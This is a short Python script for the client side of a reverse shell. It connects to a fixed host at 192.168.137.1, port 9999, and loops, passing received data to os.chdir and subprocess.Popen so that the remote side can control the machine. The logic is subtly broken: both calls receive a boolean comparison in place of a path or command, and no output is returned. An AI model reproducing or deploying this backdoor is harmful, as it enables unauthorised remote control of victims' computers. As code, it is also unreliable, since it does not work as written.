import socket
import os
import subprocess

s= socket.socket()
host = '192.168.137.1'
port = 9999
 
s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[:2].decode("utf-8") == 'cd')

    if len(data) > 0:
        cmd = subprocess.Popen(data[:2].decode("utf-8") == 'cd')
